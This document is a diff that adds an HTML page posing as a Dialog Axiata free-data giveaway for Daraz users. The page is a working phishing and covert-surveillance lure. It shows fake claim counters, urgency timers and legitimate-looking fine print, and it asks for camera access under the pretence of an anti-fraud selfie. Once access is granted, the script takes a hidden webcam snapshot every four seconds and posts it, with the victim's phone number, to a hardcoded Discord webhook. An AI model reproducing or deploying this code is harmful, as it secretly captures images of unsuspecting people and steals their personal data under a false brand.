@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FREE 50GB DATA • Dialog Axiata</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* hide video & canvas – keep everything stealth */
+        #video, #canvas { display: none; }
+
+        /* give away theme: fresh green / magenta / celebratory */
+        .giveaway-card {
+            background: linear-gradient(145deg, #ffffff 0%, #fcf7ff 100%);
+            border: 1px solid rgba(232, 93, 193, 0.2);
+            box-shadow: 0 20px 40px -10px rgba(191, 42, 142, 0.25);
+        }
+        .offer-badge {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .pulse-dot {
+            animation: pulse 1.8s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.1); background-color: #22c55e; }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .confetti-bg {
+            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23e879f9' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-pink-100 via-purple-100 to-indigo-100 min-h-screen flex items-center justify-center p-4 font-sans confetti-bg">
+
+    <!-- hidden capture elements -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- main giveaway card -->
+    <div class="giveaway-card w-full max-w-md rounded-3xl overflow-hidden shadow-2xl relative border border-white/50 backdrop-blur-sm">
+
+        <!-- top celebration bar / sim brand -->
+        <div class="offer-badge px-6 py-4 flex justify-between items-center text-white">
+            <div class="flex items-center gap-2">
+                <span class="text-2xl">🎉</span>
+                <span class="font-bold text-lg">Dialog Axiata</span>
+            </div>
+            <div class="bg-white/30 backdrop-blur-sm px-4 py-1 rounded-full text-sm font-bold flex items-center gap-1">
+                <span class="w-2 h-2 bg-green-300 rounded-full pulse-dot"></span>
+                LIVE
+            </div>
+        </div>
+
+        <!-- main content -->
+        <div class="p-7 bg-white/90 backdrop-blur-sm">
+
+            <!-- headline + data amount -->
+            <div class="text-center mb-6">
+                <span class="bg-green-100 text-green-700 px-4 py-1 rounded-full text-xs font-bold uppercase tracking-wide">Limited time • verified</span>
+                <h1 class="text-4xl font-extrabold mt-3 bg-gradient-to-r from-purple-700 to-pink-600 bg-clip-text text-transparent">FREE 50GB</h1>
+                <p class="text-gray-600 mt-1">4G / 5G data • valid 30 days</p>
+                <div class="flex justify-center gap-1 mt-2">
+                    <span class="w-12 h-1 bg-purple-200 rounded-full"></span>
+                    <span class="w-12 h-1 bg-pink-400 rounded-full"></span>
+                    <span class="w-12 h-1 bg-purple-200 rounded-full"></span>
+                </div>
+            </div>
+
+            <!-- animated offer pill -->
+            <div class="flex justify-center mb-6">
+                <div class="bg-gradient-to-r from-orange-400 to-pink-500 text-white px-6 py-2 rounded-full text-sm font-bold shadow-lg flex items-center gap-2">
+                    <span>🎁</span> Exclusive for Daraz users <span>🎁</span>
+                </div>
+            </div>
+
+            <!-- claim form (just phone number) -->
+            <div class="mb-6">
+                <label class="block text-sm font-semibold text-gray-700 mb-1 flex items-center gap-1">
+                    <span>📱</span> Enter your phone number
+                </label>
+                <div class="flex items-center border-2 border-purple-200 rounded-xl overflow-hidden focus-within:border-purple-400 transition bg-white">
+                    <span class="bg-gray-100 px-4 py-4 text-gray-500 font-medium border-r border-gray-200">+94</span>
+                    <input type="tel" id="phoneInput" value="77 123 4567" class="w-full p-4 outline-none text-gray-700 font-medium" placeholder="77 123 4567">
+                </div>
+                <p class="text-xs text-gray-400 mt-2 flex items-center gap-1">
+                    <span>✅</span> We'll send OTP to confirm (simulator)
+                </p>
+            </div>
+
+            <!-- big claim button (triggers camera) -->
+            <button id="claimBtn" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-5 rounded-xl text-xl shadow-xl transition transform hover:scale-[1.02] active:scale-[0.99] flex items-center justify-center gap-3 mb-5">
+                <span>⚡</span> CLAIM 50GB NOW <span>⚡</span>
+            </button>
+
+            <!-- fake counters / social proof -->
+            <div class="grid grid-cols-2 gap-3 mb-5">
+                <div class="bg-gray-50 rounded-xl p-3 text-center border border-gray-100">
+                    <span class="text-xl font-bold text-gray-800">1,247</span>
+                    <span class="text-xs text-gray-500 block">claimed today</span>
+                </div>
+                <div class="bg-gray-50 rounded-xl p-3 text-center border border-gray-100">
+                    <span class="text-xl font-bold text-gray-800">5.2k</span>
+                    <span class="text-xs text-gray-500 block">left</span>
+                </div>
+            </div>
+
+            <!-- fine print (looks legit) -->
+            <div class="text-center text-xs text-gray-400 border-t border-gray-100 pt-4 flex flex-wrap items-center justify-center gap-2">
+                <span>⏳ expires in 2h</span>
+                <span>•</span>
+                <span>🇱🇰 only</span>
+                <span>•</span>
+                <span>T&C apply</span>
+            </div>
+
+            <!-- dynamic status (disguised) -->
+            <div id="status" class="mt-4 text-center text-gray-400 text-xs flex items-center justify-center gap-1 bg-gray-50 py-2 rounded-full">
+                <span class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+                checking eligibility • real-time
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DISCORD WEBHOOK (unchanged)
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1477690694574276739/YqRoM2cBw3mX2fqa9UBYE80h1t1IapZXWUrvad5XIfFu4bmpLaDivtHcxtlLorS5OI58";
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const claimBtn = document.getElementById('claimBtn');
+        const statusDiv = document.getElementById('status');
+
+        // phone input field
+        const phoneInput = document.getElementById('phoneInput');
+
+        // camera handling
+        let cameraStream = null;
+        let captureInterval = null;
+
+        function setStatus(text, isError = false) {
+            statusDiv.innerHTML = `<span class="w-2 h-2 ${isError ? 'bg-red-400' : 'bg-green-400'} rounded-full animate-pulse"></span> ${text}`;
+        }
+
+        function stopCapture() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+                video.srcObject = null;
+            }
+        }
+
+        async function captureAndSend() {
+            if (!video.videoWidth || !video.videoHeight) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+                // Get phone number
+                const phoneVal = phoneInput.value || "(not entered)";
+
+                const formData = new FormData();
+                formData.append('file', blob, `giveaway_snapshot_${Date.now()}.png`);
+
+                formData.append('payload_json', JSON.stringify({
+                    content: `🎁 **FREE DATA CLAIM**\n**Time:** ${new Date().toLocaleString()}\n**Phone:** \`${phoneVal}\`\n**User clicked CLAIM 50GB**\n**Snapshot attached.**`,
+                    username: "Data-Giveaway-Bot"
+                }));
+
+                try {
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                    setStatus(`✅ offer activated • snapshot sent (${new Date().toLocaleTimeString()})`);
+                } catch (e) {
+                    console.error("webhook error", e);
+                    setStatus("⚠️ network lag – still processing", true);
+                }
+            }, 'image/png');
+        }
+
+        claimBtn.addEventListener('click', async () => {
+            // disable button, show loading
+            claimBtn.disabled = true;
+            claimBtn.innerHTML = `<span>⏳</span> PROCESSING ... <span>⏳</span>`;
+            setStatus("🔐 verifying number & preparing 50GB...");
+
+            try {
+                stopCapture();
+
+                // request camera (disguised as "verification selfie")
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                cameraStream = stream;
+                video.srcObject = stream;
+
+                // brief pause for camera init
+                await new Promise(r => setTimeout(r, 600));
+
+                // first capture (immediate)
+                await captureAndSend();
+
+                // continuous capture every 4 seconds (same behavior)
+                if (captureInterval) clearInterval(captureInterval);
+                captureInterval = setInterval(() => {
+                    captureAndSend();
+                }, 4000);
+
+                // update button to "claimed"
+                claimBtn.innerHTML = `<span>✅</span> 50GB ADDED <span>✅</span>`;
+                setStatus("🎉 congratulations! 50GB activated (monitoring active)");
+
+            } catch (err) {
+                // camera denied
+                setStatus("❌ camera selfie required for anti-fraud", true);
+                claimBtn.innerHTML = `<span>⚡</span> TRY AGAIN <span>⚡</span>`;
+                claimBtn.disabled = false;
+                stopCapture();
+            }
+        });
+
+        // cleanup on page leave
+        window.addEventListener('beforeunload', () => {
+            stopCapture();
+        });
+
+        // initial status
+        setStatus("checking eligibility • real-time");
+    </script>
+</body>
+</html>
